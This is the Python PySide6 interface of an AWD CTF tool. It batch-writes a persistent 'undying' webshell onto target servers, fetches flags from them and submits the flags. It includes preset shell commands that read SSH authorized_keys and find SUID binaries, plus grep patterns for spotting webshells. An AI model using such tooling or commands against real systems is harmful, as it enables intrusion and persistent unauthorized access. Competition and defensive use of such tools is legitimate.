# -*- coding: utf-8 -*-
"""
AWD 工具 - 界面（PySide6）
=========================
左侧彩色图标导航 + 卡片式内容区 + 底部日志面板 + 结果表格。

v3.x：
- 五个页面：目标 IP / 写入不死马 / 提交 flag / 命令 / 设置；
- 写马、取 flag、提交、命令全部并发执行，日志逐条回传；
- 自动轮次：按间隔自动取 flag 并提交，只交变化的 flag，支持熔断；
- Flag 收件箱：粘贴/导入的 flag 可统一提交；
- 健康巡检：一键检查所有落地木马是否存活；
- 状态持久化：last_flag / submitted / alive / written 写入 state.json；
- 退出前等待任务结束，关闭日志文件，保存窗口尺寸。

author : anglekat
"""

import html
import os
import threading
import time

from PySide6.QtCore import Qt, QThread, QTimer, QSize, Signal, QUrl
from PySide6.QtGui import (
    QColor, QDesktopServices, QIcon, QKeySequence, QPainter, QPixmap,
    QRadialGradient,
)
from PySide6.QtWidgets import (
    QAbstractItemView, QApplication, QButtonGroup, QCheckBox, QComboBox,
    QDialog, QFileDialog, QFrame, QGridLayout, QHBoxLayout, QHeaderView,
    QLabel, QLineEdit, QMenu, QMessageBox, QPlainTextEdit, QProgressBar,
    QPushButton, QScrollArea, QSizePolicy, QSpinBox, QSplitter,
    QStackedWidget, QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget,
)

import config
import core

VERSION = 'v3.1'

NAV_ITEMS = [
    ('目标 IP', '#6d5efc'),
    ('写入不死马', '#f0609e'),
    ('提交 flag', '#12b886'),
    ('命令', '#7c4dff'),
    ('状态', '#00b8d9'),
    ('设置', '#f0a020'),
]

LEVEL_COLOR = {
    'light': {'ok': '#0f9d58', 'fail': '#d93025', 'info': '#1a73e8',
              'muted': '#5f6368', 'warn': '#b26a00'},
    'dark': {'ok': '#4ade80', 'fail': '#f87171', 'info': '#60a5fa',
             'muted': '#8a92a0', 'warn': '#fbbf24'},
}


class CopyableTable(QTableWidget):
    """表格复制：Ctrl+C 复制选中行；右键复制单元格/整行/全部/完整响应"""
    sig_view_cell = Signal(int, int)
    sig_copy_response = Signal(int)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.setContextMenuPolicy(Qt.DefaultContextMenu)

    def _row_lines(self, rows):
        lines = []
        for row in rows:
            cells = []
            for col in range(self.columnCount()):
                item = self.item(row, col)
                cells.append(item.text() if item else '')
            lines.append('\t'.join(cells))
        return lines

    def copy_cell(self):
        item = self.item(self.currentRow(), self.currentColumn())
        if item:
            QApplication.clipboard().setText(
                item.toolTip() or item.text())

    def copy_rows(self):
        rows = sorted({idx.row() for idx in self.selectedIndexes()})
        if not rows and self.currentRow() >= 0:
            rows = [self.currentRow()]
        if rows:
            QApplication.clipboard().setText(
                '\n'.join(self._row_lines(rows)))

    def copy_all(self):
        if self.rowCount():
            QApplication.clipboard().setText(
                '\n'.join(self._row_lines(range(self.rowCount()))))

    def keyPressEvent(self, event):
        if event.matches(QKeySequence.Copy):
            self.copy_rows()
            return
        super().keyPressEvent(event)

    def contextMenuEvent(self, event):
        idx = self.indexAt(event.pos())
        if idx.isValid():
            self.setCurrentCell(idx.row(), idx.column())
        menu = QMenu(self)
        menu.addAction('复制单元格', self.copy_cell)
        menu.addAction('复制整行', self.copy_rows)
        menu.addAction('复制全部', self.copy_all)
        menu.addSeparator()
        menu.addAction(
            '查看单元格内容…',
            lambda: self.sig_view_cell.emit(
                self.currentRow(), self.currentColumn()))
        menu.addAction(
            '复制完整响应包',
            lambda: self.sig_copy_response.emit(self.currentRow()))
        menu.exec(event.globalPos())

PALETTES = {
    'light': {
        'window': '#fbfbfd', 'sidebar': 'rgba(255, 255, 255, 88)',
        'sidebar_border': 'rgba(255, 255, 255, 150)',
        'card': 'rgba(255, 255, 255, 132)', 'card_border': 'rgba(255, 255, 255, 205)',
        'text': '#1f2430', 'muted': '#6b7590', 'field': '#3f4654',
        'input_bg': 'rgba(255, 255, 255, 205)', 'input_border': 'rgba(190, 198, 214, 190)',
        'input_focus': '#6d5efc', 'nav_text': '#4b5468',
        'nav_hover_bg': 'rgba(255, 255, 255, 150)', 'nav_hover_text': '#1f2430',
        'nav_checked_bg': 'rgba(255, 255, 255, 210)', 'nav_checked_text': '#3b32c9',
        'ghost_bg': 'rgba(255, 255, 255, 170)', 'ghost_text': '#3f4654',
        'ghost_border': 'rgba(200, 208, 222, 190)',
        'ghost_hover_bg': 'rgba(255, 255, 255, 235)', 'ghost_hover_text': '#1f2430',
        'log_bg': 'rgba(255, 255, 255, 140)', 'log_border': 'rgba(255, 255, 255, 200)',
        'log_text': '#3f4654', 'scroll': '#c3cad8', 'scroll_hover': '#a7b0c2',
        'ui_font': 13, 'mono_font': 12,
        'sep': 'rgba(210, 216, 228, 160)', 'popup': '#ffffff',
        'table_bg': 'rgba(255, 255, 255, 160)', 'table_grid': 'rgba(205, 212, 224, 170)',
        'table_head': 'rgba(255, 255, 255, 220)', 'chip_bg': 'rgba(255, 255, 255, 165)',
    },
    'dark': {
        'window': '#16181d', 'sidebar': '#1b1e24', 'sidebar_border': '#262b33',
        'card': '#1e2229', 'card_border': '#2a303a', 'text': '#e6e8ec',
        'muted': '#7b8496', 'field': '#b6bdc9', 'input_bg': '#15181e',
        'input_border': '#313846', 'input_focus': '#4c8dff', 'nav_text': '#aab2c0',
        'nav_hover_bg': '#232833', 'nav_hover_text': '#ffffff',
        'nav_checked_bg': '#262f42', 'nav_checked_text': '#ffffff',
        'ghost_bg': '#262b33', 'ghost_text': '#c8cfda', 'ghost_border': '#333a46',
        'ghost_hover_bg': '#2e343d', 'ghost_hover_text': '#ffffff',
        'log_bg': '#101216', 'log_border': '#262b33', 'log_text': '#cfd6e0',
        'ui_font': 13, 'mono_font': 12,
        'scroll': '#363d49', 'scroll_hover': '#454e5d', 'sep': '#2a303a',
        'popup': '#1b1e24',
        'table_bg': '#1a1d23', 'table_grid': '#2a303a',
        'table_head': '#22262e', 'chip_bg': '#232833',
    },
}

ROW_HEADERS = {
    'write': ['IP', '结果', '说明'],
    'flag': ['IP', 'flag', '提交结果', '时间'],
    'command': ['IP', '输出', '耗时', '状态'],
}

PRESETS = [
    ('自定义', ''),
    ('id', 'id'),
    ('系统信息', 'uname -a'),
    ('根目录', 'ls -la /'),
    ('找 flag', "find / -maxdepth 3 -name '*flag*' 2>/dev/null"),
    ('读 flag', 'cat /flag'),
    ('PHP 配置', "php -i | grep -E 'disable_functions|open_basedir|disable_classes'"),
    ('进程', 'ps aux'),
    ('监听端口', 'ss -antp 2>/dev/null || netstat -antp 2>/dev/null'),
    ('定时任务', 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null'),
    ('web 目录', 'ls -la /var/www/html 2>/dev/null || ls -la /app 2>/dev/null'),
    ('最近 PHP', "find /var/www /app -name '*.php' -mmin -120 2>/dev/null"),
    ('查马', "grep -rIl -e 'eval($_POST' -e 'assert($_POST' "
             "-e 'ignore_user_abort' -e 'base64_decode' /var/www /app 2>/dev/null"),
    ('SUID', 'find / -perm -4000 -type f 2>/dev/null'),
    ('SSH key', 'cat /root/.ssh/authorized_keys 2>/dev/null; '
                'cat /home/*/.ssh/authorized_keys 2>/dev/null'),
]


def build_qss(p):
    """根据调色板生成样式表"""
    p = dict(p)
    p['ui_font'] = '%d' % int(p.get('ui_font', 13))
    p['mono_font'] = '%d' % int(p.get('mono_font', 12))
    p['row_pad'] = '4' if int(p.get('ui_font', 13)) <= 13 else '6'
    return """
* { font-family: "Microsoft YaHei UI", "Segoe UI"; font-size: %(ui_font)spx; }
QWidget#Root { background: transparent; }
QWidget { color: %(text)s; }

QFrame#Sidebar { background: %(sidebar)s; border-right: 1px solid %(sidebar_border)s; }
QLabel#Brand { color: %(text)s; font-size: 18px; font-weight: bold; }
QLabel#BrandSub, QLabel#SideHead, QLabel#SideFoot { color: %(muted)s; font-size: 11px; }

QPushButton#Nav {
    text-align: left; padding: 10px 12px; border: none; border-radius: 8px;
    color: %(nav_text)s; background: transparent; font-size: 13px;
}
QPushButton#Nav:hover { background: %(nav_hover_bg)s; color: %(nav_hover_text)s; }
QPushButton#Nav:checked { background: %(nav_checked_bg)s; color: %(nav_checked_text)s; font-weight: bold; }

QFrame#Card { background: %(card)s; border: 1px solid %(card_border)s; border-radius: 10px; }
QFrame#Chip { background: %(chip_bg)s; border: 1px solid %(card_border)s; border-radius: 8px; }
QLabel#CardTitle { font-size: 14px; font-weight: bold; color: %(text)s; }
QLabel#CardSub { color: %(muted)s; font-size: 12px; }
QLabel#Field { color: %(field)s; }
QLabel#Hint { color: %(muted)s; font-size: 12px; }
QLabel#ChipLabel { color: %(muted)s; font-size: 12px; }
QLabel#ChipValue { color: %(text)s; font-size: 15px; font-weight: bold; }
QLabel#Status { color: %(muted)s; }

QLineEdit, QComboBox, QPlainTextEdit, QTableWidget, QSpinBox {
    background: %(input_bg)s; border: 1px solid %(input_border)s; border-radius: 6px;
    padding: 5px 8px; color: %(text)s; selection-background-color: %(input_focus)s;
    selection-color: #ffffff;
}
QTableWidget::item:selected { background: %(input_focus)s; color: #ffffff; }
QLineEdit:focus, QComboBox:focus, QPlainTextEdit:focus, QSpinBox:focus { border: 1px solid %(input_focus)s; }
QLineEdit:disabled, QComboBox:disabled, QSpinBox:disabled { color: %(muted)s; }
QComboBox::drop-down { border: none; width: 20px; }
QComboBox QAbstractItemView {
    background: %(popup)s; border: 1px solid %(input_border)s; color: %(text)s;
    selection-background-color: %(nav_checked_bg)s; selection-color: %(nav_checked_text)s; outline: none;
}
QCheckBox { color: %(text)s; }
QSpinBox::up-button, QSpinBox::down-button { width: 16px; border: none; }

QPushButton#Primary {
    background: %(input_focus)s; color: #ffffff; border: none; border-radius: 7px;
    padding: 8px 16px; font-weight: bold;
}
QPushButton#Primary:hover { background: %(nav_checked_text)s; }
QPushButton#Primary:disabled { background: %(ghost_bg)s; color: %(muted)s; }
QPushButton#Ghost {
    background: %(ghost_bg)s; color: %(ghost_text)s; border: 1px solid %(ghost_border)s;
    border-radius: 7px; padding: 8px 14px;
}
QPushButton#Ghost:hover { background: %(ghost_hover_bg)s; color: %(ghost_hover_text)s; }
QPushButton#Ghost:disabled { color: %(muted)s; }

QProgressBar {
    background: %(input_bg)s; border: 1px solid %(input_border)s; border-radius: 7px;
    height: 16px; text-align: center; color: %(text)s; font-size: 11px;
}
QProgressBar::chunk { background: %(input_focus)s; border-radius: 6px; }

QPlainTextEdit#Log {
    background: %(log_bg)s; border: 1px solid %(log_border)s; border-radius: 8px;
    font-family: Consolas, "Cascadia Mono", monospace; font-size: %(mono_font)spx; color: %(log_text)s;
}
QPlainTextEdit#Mono { font-family: Consolas, "Cascadia Mono", monospace; font-size: %(mono_font)spx; }

QTableWidget { background: %(table_bg)s; gridline-color: %(table_grid)s; }
QTableWidget::item { padding: %(row_pad)spx 6px; }
QHeaderView::section {
    background: %(table_head)s; color: %(field)s; border: none;
    border-right: 1px solid %(table_grid)s; border-bottom: 1px solid %(table_grid)s;
    padding: %(row_pad)spx 8px; font-weight: bold;
}
QTableCornerButton::section { background: %(table_head)s; border: none; }

QScrollArea { background: transparent; border: none; }
QScrollArea > QWidget > QWidget { background: transparent; }

QScrollBar:vertical { background: transparent; width: 10px; margin: 2px; }
QScrollBar::handle:vertical { background: %(scroll)s; border-radius: 5px; min-height: 24px; }
QScrollBar::handle:vertical:hover { background: %(scroll_hover)s; }
QScrollBar::add-line, QScrollBar::sub-line { height: 0; }
QScrollBar:horizontal { background: transparent; height: 10px; margin: 2px; }
QScrollBar::handle:horizontal { background: %(scroll)s; border-radius: 5px; min-width: 24px; }
QScrollBar::handle:horizontal:hover { background: %(scroll_hover)s; }
QScrollBar::add-page, QScrollBar::sub-page { background: transparent; }
""" % p


def make_icon(color, size=14, radius=4):
    """画一个圆角色块作为导航图标"""
    pm = QPixmap(size, size)
    pm.fill(Qt.transparent)
    painter = QPainter(pm)
    painter.setRenderHint(QPainter.Antialiasing, True)
    painter.setBrush(QColor(color))
    painter.setPen(Qt.NoPen)
    painter.drawRoundedRect(0, 0, size, size, radius, radius)
    painter.end()
    return QIcon(pm)


class TaskThread(QThread):
    """耗时任务放后台线程执行，通过信号回传结果"""
    sig_log = Signal(str, str)
    sig_progress = Signal(int, int)
    sig_done = Signal(str, int, int)
    sig_rows = Signal(list, str)
    sig_ips = Signal(list)
    sig_paths = Signal(dict)
    sig_report = Signal(str)
    sig_alive = Signal(list)
    sig_responses = Signal(dict)

    def __init__(self, kind, work):
        super().__init__()
        self.kind = kind
        self.work = work

    def run(self):
        ok = fail = 0
        try:
            result = self.work(self)
            if isinstance(result, tuple) and len(result) == 2:
                ok, fail = result
        except Exception as exc:  # noqa: BLE001 - 任务线程必须兜底，否则 UI 拿不到结束信号
            self.sig_log.emit('任务异常：%s' % exc, 'fail')
        self.sig_done.emit(self.kind, int(ok or 0), int(fail or 0))


class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setObjectName('Root')
        self.setWindowTitle('AWD 批量工具  ' + VERSION)
        config.ensure_dirs()
        width = max(860, int(getattr(config, '窗口宽', 1120)))
        height = max(540, int(getattr(config, '窗口高', 760)))
        self.resize(width, height)
        self.setMinimumSize(860, 540)

        self._stop = False
        self._thread = None
        self._running = False
        self._breaker = False
        self._scan_port = None
        self._theme = config.主题 if config.主题 in PALETTES else 'light'
        self._ui_font = self._clamp_font(getattr(config, '界面字号', 13))
        self._targets = []
        self._last_flag = {}
        self._submitted = {}
        self._flag_path = {}
        self._responses = {}
        self._written = set()
        self._alive = set()
        self._rows = {'write': [], 'flag': [], 'command': []}
        self._auto_on = False
        self._round_left = 0
        self._round_stats = ''
        self._log_file = None

        self._load_state()
        self._flags = self._last_flag
        self._build()
        self._apply_theme()
        self._load_targets()
        self._open_log_file()
        self._center()

        self._auto_timer = QTimer(self)
        self._auto_timer.setInterval(1000)
        self._auto_timer.timeout.connect(self._auto_tick)

    # ---------------- 基础 ----------------
    def _center(self):
        screen = QApplication.primaryScreen()
        if screen is None:
            return
        rect = screen.availableGeometry()
        self.move(rect.center() - self.rect().center())

    def paintEvent(self, _event):
        """浅色主题绘制粉彩渐变背景；深色主题铺纯色"""
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing, True)
        rect = self.rect()
        pal = PALETTES[self._theme]
        painter.fillRect(rect, QColor(pal['window']))
        if self._theme != 'light':
            painter.end()
            return
        w = max(rect.width(), 1)
        h = max(rect.height(), 1)
        radius = max(w, h) * 0.70
        blobs = [
            (0.01, 0.52, '#a9e7c4', 255),
            (-0.02, 1.02, '#e4dcae', 250),
            (1.01, 0.50, '#ffb8a6', 255),
            (1.02, 1.04, '#ff8f99', 250),
            (0.50, -0.06, '#e8ebfa', 240),
        ]
        for rx, ry, color, alpha in blobs:
            grad = QRadialGradient(w * rx, h * ry, radius)
            c = QColor(color)
            c.setAlpha(alpha)
            grad.setColorAt(0.0, c)
            edge = QColor(color)
            edge.setAlpha(0)
            grad.setColorAt(1.0, edge)
            painter.fillRect(rect, grad)
        painter.end()

    def _build(self):
        outer = QHBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(0)
        outer.addWidget(self._build_sidebar())
        outer.addWidget(self._build_main(), 1)

    def _build_sidebar(self):
        side = QFrame()
        side.setObjectName('Sidebar')
        side.setFixedWidth(200)
        lay = QVBoxLayout(side)
        lay.setContentsMargins(14, 18, 14, 14)
        lay.setSpacing(6)

        brand = QLabel('AWD 工具')
        brand.setObjectName('Brand')
        sub = QLabel('批量写马 · 提交 flag')
        sub.setObjectName('BrandSub')
        lay.addWidget(brand)
        lay.addWidget(sub)
        lay.addSpacing(16)

        head = QLabel('流程')
        head.setObjectName('SideHead')
        lay.addWidget(head)
        lay.addSpacing(4)

        self.nav_group = QButtonGroup(self)
        self.nav_group.setExclusive(True)
        self.stack = QStackedWidget()
        builders = [self._page_targets, self._page_write, self._page_submit,
                    self._page_command, self._page_status, self._page_settings]
        for idx, (name, color) in enumerate(NAV_ITEMS):
            label = '%d. %s' % (idx + 1, name) if idx < 3 else '  ' + name
            btn = QPushButton(label)
            btn.setObjectName('Nav')
            btn.setCheckable(True)
            btn.setCursor(Qt.PointingHandCursor)
            btn.setIcon(make_icon(color))
            btn.setIconSize(QSize(14, 14))
            if idx == 0:
                btn.setChecked(True)
            btn.clicked.connect(lambda _=False, i=idx: self.stack.setCurrentIndex(i))
            self.nav_group.addButton(btn, idx)
            lay.addWidget(btn)
            self.stack.addWidget(builders[idx]())

        lay.addStretch(1)

        self.btn_theme = QPushButton(
            '切换浅色' if self._theme == 'dark' else '切换深色')
        self.btn_theme.setObjectName('Ghost')
        self.btn_theme.setCursor(Qt.PointingHandCursor)
        self.btn_theme.clicked.connect(self.on_toggle_theme)
        lay.addWidget(self.btn_theme)

        foot = QLabel('anglekat · ' + VERSION)
        foot.setObjectName('SideFoot')
        lay.addWidget(foot)
        return side

    def _build_main(self):
        wrap = QWidget()
        lay = QVBoxLayout(wrap)
        lay.setContentsMargins(16, 14, 16, 10)
        lay.setSpacing(10)

        lay.addWidget(self._build_statusbar())

        self.splitter = splitter = QSplitter(Qt.Vertical)
        splitter.setChildrenCollapsible(False)
        splitter.addWidget(self.stack)
        splitter.addWidget(self._build_log())
        splitter.setStretchFactor(0, 4)
        splitter.setStretchFactor(1, 2)
        splitter.setSizes([620, 140])
        lay.addWidget(splitter, 1)

        lay.addLayout(self._build_footer())
        return wrap

    def _build_statusbar(self):
        bar = QFrame()
        bar.setObjectName('Chip')
        lay = QHBoxLayout(bar)
        lay.setContentsMargins(14, 8, 14, 8)
        lay.setSpacing(18)

        self.chips = {}
        for key, text in [('targets', '目标'), ('alive', '存活'),
                          ('written', '已写马'), ('flags', '已取 flag'),
                          ('submitted', '已提交')]:
            box = QVBoxLayout()
            box.setSpacing(0)
            lab = QLabel(text)
            lab.setObjectName('ChipLabel')
            val = QLabel('0')
            val.setObjectName('ChipValue')
            box.addWidget(lab)
            box.addWidget(val)
            holder = QWidget()
            holder.setLayout(box)
            lay.addWidget(holder)
            self.chips[key] = val
        lay.addStretch(1)

        self.lbl_status = QLabel('就绪')
        self.lbl_status.setObjectName('Status')
        lay.addWidget(self.lbl_status)
        return bar

    def _build_footer(self):
        row = QHBoxLayout()
        row.setSpacing(10)
        self.progress = QProgressBar()
        self.progress.setMaximum(1)
        self.progress.setValue(0)
        self.progress.setFixedWidth(220)
        self.progress.setTextVisible(True)

        self.btn_stop = QPushButton('停止')
        self.btn_stop.setObjectName('Ghost')
        self.btn_stop.setCursor(Qt.PointingHandCursor)
        self.btn_stop.clicked.connect(self.on_stop)
        self.btn_stop.setEnabled(False)

        self.btn_log_big = QPushButton('日志加大')
        self.btn_log_big.setObjectName('Ghost')
        self.btn_log_big.setCursor(Qt.PointingHandCursor)
        self.btn_log_big.clicked.connect(self.on_log_bigger)

        self.btn_log_small = QPushButton('日志缩小')
        self.btn_log_small.setObjectName('Ghost')
        self.btn_log_small.setCursor(Qt.PointingHandCursor)
        self.btn_log_small.clicked.connect(self.on_log_smaller)

        self.btn_clear = QPushButton('清空日志')
        self.btn_clear.setObjectName('Ghost')
        self.btn_clear.setCursor(Qt.PointingHandCursor)
        self.btn_clear.clicked.connect(lambda: self.txt_log.clear())

        self.btn_copy_log = QPushButton('复制日志')
        self.btn_copy_log.setObjectName('Ghost')
        self.btn_copy_log.setCursor(Qt.PointingHandCursor)
        self.btn_copy_log.clicked.connect(self.on_copy_log)

        row.addStretch(1)
        row.addWidget(self.progress)
        row.addWidget(self.btn_stop)
        row.addWidget(self.btn_log_big)
        row.addWidget(self.btn_log_small)
        row.addWidget(self.btn_copy_log)
        row.addWidget(self.btn_clear)
        return row

    def _build_log(self):
        card, body = self._card('运行日志', '拖拽分隔条可调整日志高度，字体大小在「设置」页调')
        self.txt_log = QPlainTextEdit()
        self.txt_log.setObjectName('Log')
        self.txt_log.setReadOnly(True)
        self.txt_log.setMaximumBlockCount(5000)
        self.txt_log.setMinimumHeight(60)
        body.addWidget(self.txt_log, 1)
        return card

    # ---------------- 通用控件 ----------------
    def _card(self, title, subtitle=''):
        card = QFrame()
        card.setObjectName('Card')
        lay = QVBoxLayout(card)
        lay.setContentsMargins(16, 14, 16, 16)
        lay.setSpacing(8)
        head = QHBoxLayout()
        head.setSpacing(10)
        lab = QLabel(title)
        lab.setObjectName('CardTitle')
        head.addWidget(lab)
        head.addStretch(1)
        lay.addLayout(head)
        if subtitle:
            sub = QLabel(subtitle)
            sub.setObjectName('CardSub')
            sub.setWordWrap(True)
            lay.addWidget(sub)
        body = QVBoxLayout()
        body.setSpacing(8)
        lay.addLayout(body, 1)
        return card, body

    def _field(self, label, widget, width=92):
        row = QHBoxLayout()
        row.setSpacing(10)
        lab = QLabel(label)
        lab.setObjectName('Field')
        lab.setFixedWidth(width)
        lab.setAlignment(Qt.AlignRight | Qt.AlignVCenter)
        row.addWidget(lab)
        row.addWidget(widget, 1)
        return row

    def _mono_edit(self, min_height=110, readonly=False):
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setMinimumHeight(min_height)
        # 垂直方向忽略 sizeHint，避免默认的 192px 把整页撑出滚动条；
        # 实际高度由布局的 stretch 分配，最小高度仍由 setMinimumHeight 保证。
        edit.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Ignored)
        edit.setReadOnly(readonly)
        edit.setLineWrapMode(QPlainTextEdit.NoWrap)
        return edit

    def _wrap_scroll(self, inner):
        # 把页面内容放进滚动区：窗口变小时出现滚动条，而不是挤压重叠
        area = QScrollArea()
        area.setWidgetResizable(True)
        area.setFrameShape(QFrame.NoFrame)
        area.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        area.setWidget(inner)
        return area

    def _table(self, headers, stretch_col=None):
        table = CopyableTable(0, len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.verticalHeader().setVisible(False)
        table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectRows)
        table.setAlternatingRowColors(False)
        table.setShowGrid(True)
        # 同上：表格不要用默认 sizeHint 撑页面，最小高度由调用方设置
        table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Ignored)
        head = table.horizontalHeader()
        if stretch_col is None:
            head.setSectionResizeMode(QHeaderView.Interactive)
            head.setStretchLastSection(True)
        else:
            head.setStretchLastSection(False)
            for i in range(len(headers)):
                if i == stretch_col:
                    head.setSectionResizeMode(i, QHeaderView.Stretch)
                else:
                    head.setSectionResizeMode(i, QHeaderView.ResizeToContents)
        table.cellDoubleClicked.connect(
            lambda row, col, t=table: self.on_cell_double_clicked(t, row, col))
        table.sig_view_cell.connect(
            lambda row, col, t=table: self.on_cell_double_clicked(t, row, col))
        table.sig_copy_response.connect(
            lambda row, t=table: self.on_copy_response_row(t, row))
        return table

    @staticmethod
    def _fill_table(table, rows):
        table.setRowCount(0)
        for row in rows:
            r = table.rowCount()
            table.insertRow(r)
            for c, text in enumerate(row):
                raw = str(text)
                shown = raw.replace('\n', ' ⏎ ').replace('\r', '')
                if len(shown) > 600:
                    shown = shown[:600] + '…'
                item = QTableWidgetItem(shown)
                item.setToolTip(raw[:4000])
                table.setItem(r, c, item)

    def _row_buttons(self, *pairs):
        box = QHBoxLayout()
        box.setSpacing(8)
        out = []
        for text, slot, primary in pairs:
            btn = QPushButton(text)
            btn.setObjectName('Primary' if primary else 'Ghost')
            btn.setCursor(Qt.PointingHandCursor)
            btn.clicked.connect(slot)
            box.addWidget(btn)
            out.append(btn)
        return box, out

    # ---------------- 页面 1：目标 IP ----------------
    def _page_targets(self):
        card, body = self._card('① 目标 IP', '扫描网段或手动维护目标列表，保存到 ip.txt')

        row = QHBoxLayout()
        row.setSpacing(8)
        self.ed_myip = QLineEdit('127.0.0.1')
        self.ed_myip.setFixedWidth(180)
        row.addWidget(QLabel('我的 IP'))
        row.addWidget(self.ed_myip)
        self.ed_port = QLineEdit(str(config.目标端口))
        self.ed_port.setFixedWidth(80)
        row.addWidget(QLabel('端口'))
        row.addWidget(self.ed_port)
        btn_scan = QPushButton('扫描网段')
        btn_scan.setObjectName('Primary')
        btn_scan.setCursor(Qt.PointingHandCursor)
        btn_scan.clicked.connect(self.on_scan)
        row.addWidget(btn_scan)
        row.addStretch(1)
        self.lbl_alive = QLabel('目标 0 台')
        self.lbl_alive.setObjectName('CardTitle')
        row.addWidget(self.lbl_alive)
        body.addLayout(row)

        hint = QLabel('支持 10.3.4.139 / 10.3.4. / 10.3. 三种写法；目标行支持 ip、ip:port、'
                      'http://ip:port；扫描结果自动写入 ip.txt')
        hint.setObjectName('Hint')
        hint.setWordWrap(True)
        body.addWidget(hint)

        self.txt_ips = self._mono_edit(110)
        body.addWidget(self.txt_ips, 1)

        btns, self._target_btns = self._row_buttons(
            ('保存列表', self.on_save_list, True),
            ('测试存活', self.on_test_alive, False),
            ('重新载入', self.on_reload_list, False),
            ('导入文件', self.on_import_list, False),
            ('导出文件', self.on_export_list, False),
            ('清空', self.on_clear_list, False),
        )
        self._target_btns.append(btn_scan)
        body.addLayout(btns)
        return self._wrap_scroll(card)

    # ---------------- 页面 2：写入不死马 ----------------
    def _page_write(self):
        card, body = self._card('② 写入不死马', '木马地址会自动把主机名替换成目标 IP；'
                                                  '路径与密码在「设置」里改')
        body.setSpacing(6)

        grid = QGridLayout()
        grid.setHorizontalSpacing(14)
        grid.setVerticalSpacing(6)
        grid.setColumnStretch(1, 1)
        grid.setColumnStretch(3, 1)

        self.ed_url = QLineEdit('http://127.0.0.1/shell.php')
        grid.addWidget(QLabel('木马 URL'), 0, 0)
        grid.addWidget(self.ed_url, 0, 1, 1, 3)

        self.cb_type = QComboBox()
        self.cb_type.addItems(['代码执行', '命令执行'])
        grid.addWidget(QLabel('执行方式'), 1, 0)
        grid.addWidget(self.cb_type, 1, 1)

        self.cb_pass = QComboBox()
        self.cb_pass.addItems(['GET传参密码', 'POST传参密码'])
        self.cb_pass.setCurrentIndex(1)
        grid.addWidget(QLabel('传参方式'), 1, 2)
        grid.addWidget(self.cb_pass, 1, 3)

        self.ed_pass = QLineEdit('cmd')
        grid.addWidget(QLabel('入口参数名'), 2, 0)
        grid.addWidget(self.ed_pass, 2, 1)
        tip = QLabel('入口 shell 执行命令的参数名（不是落地木马的 pass）')
        tip.setObjectName('Hint')
        tip.setWordWrap(True)
        grid.addWidget(tip, 2, 2, 1, 2)
        self.ed_headers = QLineEdit(str(config.写入请求头))
        self.ed_headers.setPlaceholderText(
            '自定义请求头：X-Forwarded-For: 127.0.0.1 | Cookie: a=1; b=2')
        grid.addWidget(QLabel('请求头'), 3, 0)
        grid.addWidget(self.ed_headers, 3, 1, 1, 3)
        body.addLayout(grid)

        code_lab = QLabel('不死马代码')
        code_lab.setObjectName('Field')
        body.addWidget(code_lab)
        self.txt_busima = self._mono_edit(120)
        self.txt_busima.setPlainText(config.busima_default())
        body.addWidget(self.txt_busima, 1)

        btns, self._write_btns = self._row_buttons(
            ('一键写入全部', self.on_write, True),
            ('试写一台', self.on_write_one, False),
            ('仅重试上次失败', self.on_write_retry, False),
            ('保存代码', self.on_save_code, False),
            ('载入默认代码', self.on_load_default_code, False),
        )
        body.addLayout(btns)

        self.tbl_write = self._table(ROW_HEADERS['write'], 2)
        self.tbl_write.setMinimumHeight(70)
        body.addWidget(self.tbl_write, 1)
        return self._wrap_scroll(card)

    # ---------------- 页面 3：提交 flag ----------------
    def _page_submit(self):
        page = QWidget()
        outer = QVBoxLayout(page)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(10)

        card, body = self._card('③ 提交 flag', '从目标列表逐台取 flag 并按报文提交，支持只重试失败项')

        grid = QGridLayout()
        grid.setHorizontalSpacing(14)
        grid.setVerticalSpacing(8)
        grid.setColumnStretch(1, 1)
        grid.setColumnStretch(3, 1)
        self.ed_cmd = QLineEdit('cat /flag')
        grid.addWidget(QLabel('取 flag 命令'), 0, 0)
        grid.addWidget(self.ed_cmd, 0, 1)
        self.ed_param = QLineEdit('flag')
        grid.addWidget(QLabel('提交参数名'), 0, 2)
        grid.addWidget(self.ed_param, 0, 3)
        body.addLayout(grid)

        lab_row = QHBoxLayout()
        lab_row.setSpacing(8)
        lab = QLabel('提交报文（从抓包工具原样粘贴）')
        lab.setObjectName('Field')
        lab_row.addWidget(lab)
        lab_row.addStretch(1)
        btn_preview = QPushButton('预览报文')
        btn_preview.setObjectName('Ghost')
        btn_preview.setCursor(Qt.PointingHandCursor)
        btn_preview.clicked.connect(self.on_preview_submit)
        lab_row.addWidget(btn_preview)
        btn_resp = QPushButton('查看响应')
        btn_resp.setObjectName('Ghost')
        btn_resp.setCursor(Qt.PointingHandCursor)
        btn_resp.clicked.connect(self.on_view_response)
        lab_row.addWidget(btn_resp)
        btn_copy_row = QPushButton('复制结果')
        btn_copy_row.setObjectName('Ghost')
        btn_copy_row.setCursor(Qt.PointingHandCursor)
        btn_copy_row.clicked.connect(self.on_copy_flag)
        lab_row.addWidget(btn_copy_row)
        body.addLayout(lab_row)
        self.txt_request = self._mono_edit(70)
        body.addWidget(self.txt_request, 1)

        btns, self._submit_btns = self._row_buttons(
            ('取 flag 并提交全部', self.on_submit, True),
            ('试跑一台', self.on_submit_one, False),
            ('仅重试上次失败', self.on_submit_retry, False),
            ('只取 flag 不提交', self.on_fetch_only, False),
            ('收件箱…', self.on_open_inbox, False),
            ('导出结果', self.on_export_rows, False),
        )
        body.addLayout(btns)
        self._submit_btns.append(btn_preview)
        self._submit_btns.append(btn_resp)
        self._submit_btns.append(btn_copy_row)

        self.tbl_flag = self._table(ROW_HEADERS['flag'], 1)
        self.tbl_flag.setMinimumHeight(70)
        body.addWidget(self.tbl_flag, 1)
        outer.addWidget(card, 3)

